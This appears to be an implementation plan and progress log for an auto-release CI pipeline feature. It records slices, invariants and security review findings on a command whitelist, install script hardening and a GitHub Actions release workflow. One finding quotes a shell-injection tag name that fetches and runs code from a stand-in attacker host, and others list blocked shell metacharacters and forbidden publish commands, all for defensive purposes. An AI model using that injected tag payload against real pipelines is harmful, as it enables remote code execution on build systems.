## Feature: Auto-Release Pipeline (iter-3)
## Branch: feat/auto-release
## Status: implementing wave 4 slice 5/7

## Plan

### Wave 1 (sequential — release-engineer prompt + bash whitelist)
- [x] Slice 1: release-engineer executing-mode flip + 4-tier authority + bash whitelist + tag-scheme disambiguation — 4d2f47b
  - Files: src/agents/release-engineer.md
  - Pre-review: architect + security-auditor (Phase 1.5 — 8 MUSTs M1–M8 inlined; b53a475)
  - Inlined architect action items #1 (tag-scheme disambiguation), #2 (FR-12.7 templates wording — implicit; only src/agents/release-engineer.md touched), #4 (Bash already present in tools — narratives updated, not added)

### Wave 2 (sequential — install.sh foundation)
- [x] Slice 2: install.sh REPO_URL fix (Koroqe → codefather-labs) + Windows uname branch + version bump 2.1.0 → 3.0.0 — 0be97d0
  - Files: install.sh
  - Pre-review: security-auditor (Phase 1.5 MEDIUM: curl/wget hardening parity — applied)

### Wave 3 (parallel — workflows; disjoint files)
- [x] Slice 3: extend sdlc-knowledge-release.yml — windows-x64 matrix + alternation find -o operator + source tarball — ab666b4
  - Files: .github/workflows/sdlc-knowledge-release.yml
  - Pre-review: none (CI-only)
  - Inlined architect action item #3 (grouped find alternation `\( -name 'libpdfium*' -o -name 'pdfium*' \) -type f` for Windows pdfium.dll)
- [x] Slice 4: new sdlc-core-release.yml — triggers on bare v* tag, uploads source + CHANGELOG body — 8dc32eb
  - Files: .github/workflows/sdlc-core-release.yml [new] + foundation .gitattributes [new] (7e4789c)
  - Pre-review: security-auditor (Phase 1.5 — M5a CRITICAL via .gitattributes export-ignore + tar -tzf defense-in-depth, M5c HIGH env-var-mediated github expressions, A1 HIGH v-prefix strip)

### Wave 4 (sequential — opt-in + bootstrap; both touch install.sh)
- [ ] Slice 5: SDLC core opt-in — auto-release rule + changelog sentinel + CHANGELOG.md + templates auto-release rule + pre-push hook template
  - Files: .claude/rules/auto-release.md [new], .claude/rules/changelog.md [new copy of templates/rules/changelog.md], CHANGELOG.md [new at repo root], templates/rules/auto-release.md [new], templates/hooks/pre-push [new], install.sh (scaffold_project extension)
  - Pre-review: architect (templates UNCHANGED scope clarification per action item #2)
- [ ] Slice 6: install.sh --bootstrap-release flag for FIRST sdlc-knowledge-v0.2.0 tag + register_release_bash_allowlist
  - Files: install.sh
  - Pre-review: security-auditor (destructive: pushes tag to origin)

### Wave 5 (sequential — docs)
- [ ] Slice 7: Documentation — README + RELEASING.md + MIGRATION.md + CHANGELOG body refinement
  - Files: README.md, tools/sdlc-knowledge/RELEASING.md, MIGRATION.md [new], CHANGELOG.md (body refinement)
  - Pre-review: none

## Bootstrap artifacts produced
- PRD §13 (lines 2974-3459) — 12 FRs, 9 NFRs, 13 ACs, 10 risks, 8 out-of-scope items, 13-row affected-files table
- `docs/use-cases/auto-release_use_cases.md` — 1510 lines, 17 primary UCs + 6 cross-cutting + 11 alt + 13 error + 12 edge = 59 scenarios
- `docs/qa/auto-release_test_cases.md` — 1447 lines, 78 TCs (incl. 5 TC-AAI architect action items + 10 TC-INV invariants + 5 TC-CP cross-platform + 16 TC-SEC across 4 security pre-review groups)
- Architect verdict: PASS, 3 [STRUCTURAL] + 1 MAJOR + 1 MINOR action items inlined into Slices 1, 3, 5; security-auditor pre-review on Slices 1, 2, 4, 6
- `.claude/resources-pending.md` — produced and consumed (zero recommendations); deleted
- `.claude/roles-pending.md` — produced and consumed (zero additional roles); deleted
- changelog-writer Step 5.5 — `no-op: not configured` (SDLC core opts out for now; FR-7 of this feature will flip)

## Knowledge-base scope verdict
**No overlap.** Corpus is ML/AI/MLOps/SRE/AI-agents domain (28 books, 51542 chunks). Iter-3 task is CI/CD release engineering — not represented in corpus. Per `~/.claude/rules/knowledge-base-tool.md` Step 0c: SKIPPED topical query phase, logged single Open Question entry per Step 0d. Verdict documented in plan.md and PRD §13 Facts blocks.

Note: corpus-scope-relevance protocol was added to the rule MID-bootstrap (commit b8d7116), then specific examples removed (commit c8438a1). Earlier bootstrap steps (PRD/use-cases/QA) ran BEFORE the rule update and accumulated some null-result Open Questions; the planner Step 5 ran AFTER and correctly applied No-overlap verdict from the start.

## Architect action items inlined into slices
1. **[STRUCTURAL] tag-scheme disambiguation** → Slice 1 (release-engineer.md Step 5 decision tree: tools/sdlc-knowledge/* changed → sdlc-knowledge-v* scheme; otherwise → bare v*; both → explicit user prompt)
2. **[STRUCTURAL] FR-12.7 templates wording** → Slice 1 + Slice 5 (invariant scope = `templates/rules/*` byte-unchanged source-of-truth files; SDLC core's own `.claude/rules/changelog.md` and `.claude/rules/auto-release.md` are NEW files at repo root, NOT modifications of templates)
3. **[STRUCTURAL] find -o syntax** → Slice 3 (`find /tmp/pdfium-staging -maxdepth 3 \( -name 'libpdfium*' -o -name 'pdfium*' \) -type f` with explicit alternation grouping)
4. **[MAJOR] FR-1.1 Bash already present** → Slice 1 description reconciliation (release-engineer.md:4 already has Bash in tools; iter-3 extends authority via tier dispatch, doesn't add the tool)
5. **[MINOR] KB corpus is ML-domain** → tracked under Open questions; iter-4 candidate for adding GitHub Actions / pdfium / Cargo Windows reference docs to corpus

## Phase 1.5 security pre-review needed (4 slices)
- Slice 1: release-engineer executing-mode + bash whitelist (anchored regex correctness, metacharacter rejection, tier table coverage, no default-allow)
- Slice 2: install.sh REPO_URL change + Windows uname branch (URL hardcoding, redirect bounds, path injection via uname output)
- Slice 4: sdlc-core-release.yml workflow (tag pattern disjoint from sdlc-knowledge-v*, permissions: contents: write scoped, actionlint self-check)
- Slice 6: install.sh --bootstrap-release (one-shot opt-in flag, prompts before push, pre-conditions enforced, [BOOTSTRAP] warning on stderr)

## Invariants (load-bearing — preserved/intentionally relaxed per FR-12)
- 17 core agents — UNCHANGED (FR-12.1)
- 10 quality gates — UNCHANGED (FR-12.2)
- 5 executor agents — BYTE-UNCHANGED (FR-12.3)
- README taglines lines 5 + 35 — BYTE-UNCHANGED
- `templates/rules/{architecture,security,testing,changelog}.md` — BYTE-UNCHANGED (NEW: `templates/rules/auto-release.md` is added — additive, not modification)
- `src/rules/cognitive-self-check.md` — BYTE-UNCHANGED
- `src/rules/knowledge-base.md` — BYTE-UNCHANGED
- `src/rules/knowledge-base-tool.md` — recently updated (multilingual + corpus-scope-relevance + generalization), NOT changed by this feature
- `install.sh` line 22 `VERSION="2.1.0"` — CHANGED to `3.0.0` in iter-3 (FR-7 SDLC core opt-in version major bump per dogfood)
- 12 thinking-agent activation blocks — BYTE-UNCHANGED
- CLI surface of sdlc-knowledge — UNCHANGED (no new subcommands)

## Out of scope iter-3
- npm/cargo/PyPI publishing (Forbidden tier; iter-4)
- sha256/sigstore signature verification of release binaries (iter-4)
- linux-arm32 / musl-libc / FreeBSD targets (iter-4)
- CHANGELOG i18n auto-translation (out of scope permanently)
- Auto-revert on regression detection (iter-4 — needs metrics infra)
- GitHub Releases body rich rendering beyond plain Keep-a-Changelog markdown
- Gate 9 changing its number/position in /merge-ready
- Pre-push hook in opt-out projects (only opt-in via .claude/rules/auto-release.md sentinel)

## Phase 1.5 security pre-review findings (binding MUSTs for implementer agents)

### Slice 1 (release-engineer executing-mode + bash whitelist) — APPROVED with 8 MUSTs
- **M1 anchored regex correctness** — every whitelist regex MUST start with `^` and end with `$`. No `.` (use `\.` for literal dots). Test fixtures must include zero-byte input, leading-whitespace input, trailing-newline input, and embedded-NUL input — all must REJECT.
- **M2 metacharacter rejection BEFORE regex match** — pre-filter rejects any input containing `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, `\` (backslash), or newline (`\n`, `\r`). This pre-filter runs FIRST, before the anchored-regex tier match. A whitelist regex that incidentally matches a string containing these metacharacters MUST still reject due to the pre-filter.
- **M3 tier-table no-default-allow** — every command falls through to a literal `Forbidden` default if it does not match any Trivial/Moderate/Sensitive regex. There is no implicit allow-list; the `match → tier` mapping is closed.
- **M4 tag-scheme disambiguation uses `git merge-base HEAD origin/main` not `HEAD~1`** — disambiguation logic computes the merge-base of HEAD against origin/main, then `git diff --name-only <merge-base>..HEAD` to enumerate changed files. Naive `HEAD~1` breaks on squash-merge or fast-forward histories where the previous commit is on the SAME feature branch.
- **M5 headless primitive parity with resource-architect** — env var `AUTO_RELEASE=1` skips Sensitive-tier confirmation prompts. Detection primitive matches resource-architect's `AUTO_INSTALL=1` and Section 7 FR-7.4 headless contract: `process.stdin.isTTY === false` OR `[ -t 0 ]` returns false OR `AUTO_RELEASE=1` is set. Same primitive, same semantics, no drift.
- **M6 sentinel-absent §6 byte-for-byte preservation** — when `.claude/rules/auto-release.md` is ABSENT in the consuming project, release-engineer Gate 9 §6 (the entire executing-mode body) MUST be skipped silent no-op; the sentinel-absent path renders byte-identical to current main's suggest-only Gate 9.
- **M7 NEVER list relocations are explicit not silent** — the FORBIDDEN tier list (`npm publish`, `cargo publish`, `pypi upload`, `gh release create`, any `--force` flag, any `git push --force-with-lease`) is enumerated in the agent prompt verbatim, not derived from a "default deny what's not Sensitive" rule. Reviewers can grep for each forbidden symbol.
- **M8 settings.json allowlist is Slice 6 not Slice 1** — Slice 1 only adds the agent's authority-tier dispatch; the matching `~/.claude/settings.json` allow entry for `~/.claude/tools/sdlc-knowledge/sdlc-knowledge release *` (or whatever symbol the binary exposes) is registered by `install.sh --bootstrap-release` in Slice 6. Slice 1 must NOT touch settings.json.

New test cases: TC-SEC-1.5 through TC-SEC-1.13 (9 cases) cover the regex/metacharacter/tier-table/disambiguation/headless/sentinel-absent matrix.

### Slice 2 (install.sh REPO_URL fix + Windows uname branch) — APPROVED with 1 MEDIUM
- **MEDIUM curl/wget hardening parity** — install.sh:376 (knowledge binary curl) currently lacks `--max-redirs 5 --max-time 120`. install.sh:382 (wget fallback) lacks `--max-redirect=5 --timeout=120`. The pdfium download path at install.sh:545 already has both. Slice 2 adds these flags to the knowledge-binary path for defense-in-depth parity. Mitigates redirect-loop DoS and infinite-stall scenarios on attacker-controlled or dead URLs.

### Slice 4 (sdlc-core-release.yml workflow) — PASS with 3 mandatory implementation requirements
- **M5a CRITICAL `git archive` honors `.gitattributes export-ignore`, NOT `.gitignore`** — the source tarball MUST exclude `.claude/`, `books/`, test fixtures, and any locally-ingested `index.db`. Add a `.gitattributes` file at repo root with `export-ignore` entries for each excluded path, OR add a pre-archive assertion step (`git ls-files | grep -E '^(\.claude/|books/|.*index\.db$)'` returning empty) that fails the workflow if violated. `.gitignore` alone is INSUFFICIENT — `git archive` ignores it by design.
- **M5c HIGH shell injection via `${{ github.ref* }}` expressions in run blocks** — never directly interpolate `${{ github.ref_name }}`, `${{ github.ref }}`, `${{ github.event.* }}` into a `run:` shell command. Assign to env vars first via `env:` block, then reference as `$ENV_VAR` in the shell. Otherwise a maliciously-named tag (`v1.0.0$(curl evil.com|sh)`) executes arbitrary code in the workflow.
- **A1 HIGH version v-prefix stripping** — when extracting the version from `${{ github.ref_name }}` (which arrives as `v1.0.0`), use `VERSION="${GITHUB_REF_NAME#v}"` in a shell step (after assigning `GITHUB_REF_NAME` via env). Do NOT rely on substring/regex inside the GHA expression syntax.

### Slice 6 (install.sh --bootstrap-release) — FAIL-pending until 10 MUSTs verbatim
- **M1 opt-in flag** — flag is `--bootstrap-release` (long form only, no short alias). Default is OFF; the bootstrap path runs only when explicitly passed.
- **M2 7-part pre-condition gate** — before any tag-creating action, ALL must pass:
  1. `git status --porcelain` returns empty (clean working tree)
  2. `git rev-parse --abbrev-ref HEAD` returns `main`
  3. `git remote get-url origin` matches `https://github.com/codefather-labs/claude-code-sdlc(\.git)?$` exactly
  4. Cargo.toml `version =` line matches the `--bootstrap-release` argument
  5. No existing tag with that version locally (`git tag -l <tag>` empty) AND no existing tag remotely (`git ls-remote --tags origin <tag>` empty)
  6. `gh auth status` exits 0
  7. The release-notes file `.claude/release-notes-<version>.md` exists and is non-empty
- **M3 NEW argument sanitization regex** — the version argument MUST match `^[0-9]+\.[0-9]+\.[0-9]+$` exactly. Reject pre-release suffixes (`1.0.0-rc.1`), build metadata (`1.0.0+abc`), v-prefix (`v1.0.0`), and any leading/trailing whitespace.
- **M4 confirmation prompt with literal `[y/N]` (NOT `[yes/N]`)** — the prompt string is exactly `Push tag <tag> to origin? [y/N] `. Default-deny on empty input, anything other than literal `y` or `Y`. Match resource-architect's prompt grammar.
- **M5 headless contract layered on top of pre-conditions** — when `AUTO_RELEASE=1` is set, M2 pre-conditions still run; only the M4 prompt is skipped (auto-confirm). Pre-condition failures still abort.
- **M6 atomic rollback on push failure** — if `git push origin <tag>` fails after `git tag -a <tag>` succeeded locally, immediately run `git tag -d <tag>` to restore prior state. Do NOT leave a half-applied tag.
- **M7 idempotency on re-run** — re-running `--bootstrap-release <same-version>` after a successful push detects the existing remote tag (M2.5) and exits 0 with a `[BOOTSTRAP] tag <tag> already exists; nothing to do` log line.
- **M8 NEVER `--force`** — no `--force`, `--force-with-lease`, or `+refs/tags/...:refs/tags/...` syntax. Tag pushes are non-destructive only.
- **M9 `[BOOTSTRAP]` audit-trail logging** — every git command (the eventual `git tag -a` and `git push origin`) is preceded by a stderr line `[BOOTSTRAP] running: <command>`. The literal `[BOOTSTRAP]` prefix lets reviewers grep audit logs.
- **M10 error-message hygiene** — abort messages MUST NOT include raw `git remote get-url origin` output, raw `gh auth status` output, or any token fragments. Use canonical sanitized messages: `pre-condition failed: origin URL mismatch (expected codefather-labs/claude-code-sdlc)`, `pre-condition failed: gh CLI not authenticated`, etc.

## Completed
- Slice 1 (Wave 1 complete) — 4d2f47b — release-engineer §7 executing mode + 4-tier authority + bash whitelist + tag-scheme disambiguation; sentinel-absent path byte-identical to current main suggest-only Gate 9; all 8 Slice 1 security MUSTs (M1–M8) inlined; architect action items #1/#2/#4 inlined; file grew 446 → 554 lines (+108)
- Slice 2 (Wave 2 complete) — 0be97d0 — install.sh REPO_URL Koroqe→codefather-labs (unblocks piped curl|bash bootstrap); VERSION 2.1.0→3.0.0 (matches major bump from §7 executing-mode flip); Windows uname branch (MINGW/MSYS/CYGWIN → windows-x64 + .exe handling end-to-end including cargo fallback); Slice 2 security MEDIUM applied (curl --max-redirs 5 --max-time 120 + wget --max-redirect=5 --timeout=120 --secure-protocol=TLSv1_2 parity with pdfium path)
- Foundation chore — 7e4789c — .gitattributes export-ignore for source-tarball hygiene (.claude/, docs/qa/, docs/use-cases/, books/) before Wave 3 dispatch
- Slice 3 (Wave 3 parallel) — ab666b4 — sdlc-knowledge-release.yml extended with windows-x64 matrix (target x86_64-pc-windows-msvc, .exe handling), grouped find alternation for Windows pdfium.dll, source tarball generation + upload, stat-with-wc fallback for Windows binary size check; TODO noted for pdf.rs cfg(unix) gate in iter-3.1
- Slice 4 (Wave 3 parallel; Wave 3 complete) — 8dc32eb — new sdlc-core-release.yml triggers on bare v*.*.* tag (disjoint from sdlc-knowledge-v*), generates source tarball via git archive (M5a satisfied via .gitattributes), env-var-mediated github expressions (M5c shell-injection prevention), v-prefix strip via ${GITHUB_REF_NAME#v} (A1), tar -tzf grep defense-in-depth, body_path: .claude/release-notes-${VERSION}.md from checkout tree, softprops/action-gh-release@v2

## Blockers
(none)
